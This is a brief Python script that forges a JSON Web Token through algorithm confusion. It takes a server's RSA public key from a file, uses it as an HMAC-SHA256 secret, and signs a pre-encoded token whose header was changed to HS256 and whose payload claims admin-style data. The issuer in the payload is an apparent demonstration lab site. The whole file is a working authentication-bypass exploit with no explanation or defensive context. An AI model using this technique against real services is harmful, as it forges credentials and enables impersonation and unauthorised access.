import hmac
import base64
import hashlib

file = open("public.pem","rb")
key = file.read() #storing public key as secret
#modified header("alg":"hs256") and payload
str= "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vYXR0YWNrLnNqb2VyZGxhbmdrZW1wZXIubmwvIiwiaWF0IjoxNjQ1NzgzNzYxLCJleHAiOjE2NDU3ODQ5NjEsImRhdGEiOnsiaGVsbG8iOiJ3b3JsZCBhZG1pbiJ9fQ".encode('utf-8')   
sign = base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
print(sign)
jwt_token=str.decode('utf-8')+"."+sign
print("jwt_token has been generated:\n"+ jwt_token)
